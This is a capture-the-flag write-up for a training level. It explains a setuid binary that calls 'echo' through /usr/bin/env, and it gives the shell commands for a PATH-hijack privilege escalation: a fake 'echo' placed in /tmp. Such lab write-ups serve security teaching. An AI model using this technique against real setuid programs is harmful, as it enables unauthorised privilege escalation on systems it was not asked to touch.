# Level03

[FRENCH version](README.md)

## How to recover the flag

At first I thought level03 was a file.

A cat hit on it, you can see that it's an executable.

Also, it has strange permissions for an executable:

```
-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03*
```

The file has a Set-User-ID bit.

It allows a user to run the program with the owner's rights, this is how sudo allows us to run commands as "root".

So it should allow us to execute it with the rights of flag03.

See this video for clearer explanations: https://www.youtube.com/watch?v=2gHp_CgUets

Once launched, it only displays 'Exploit me'.

Cutter launches.

In the main function you can see this code:

```
void main(void)
{
    undefined4 uVar1;
    undefined4 uVar2;

    uVar1 = getegid();
    uVar2 = geteuid();
    setresgid(uVar1, uVar1, uVar1);
    setresuid(uVar2, uVar2, uVar2);
    system("/usr/bin/env echo Exploit me");
    return;
}
```

According to the man:

```
getegid() returns the effective group ID of the calling process.

geteuid() returns the effective user ID of the calling process.

setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

setresgid() sets the real GID, effective GID, and saved set-group-ID of the calling process (and always modifies the file system GID to be the same as the effective GID)

system() executes a command specified in command by calling /bin/sh -c command, and returns after the command has been completed. During execution of the command, SIGCHLD will be blocked, and SIGINT and SIGQUIT will be ignored.
```

During the execution, we can see that the uid and gid are valid 2003 (uid and gid of level03)

You can change the uid and gid of the executable using gdb:

see: https://scc.ustc.edu.cn/zlsc/sugon/intel/debugger/cl/commandref/gdb_mode/cmd_set_variable.htm

After many unsuccessful attempts to change the text of "/usr/bin/env echo Exploit me", I abandoned this method.

While doing a test on my host computer, with the same code, I realized that, even when run with flag03 rights, /usr/bin/env keeps the environment variables of level03.

So we can do a path redirection.

Moreover, /tmp is writable.

We can then exploit the path!

```
echo "/bin/getflag" > /tmp/echo

chmod +x /tmp/echo

export PATH=/tmp:$PATH

/level03
```

## The flag

The flag read is the one that can be used to connect to level04.
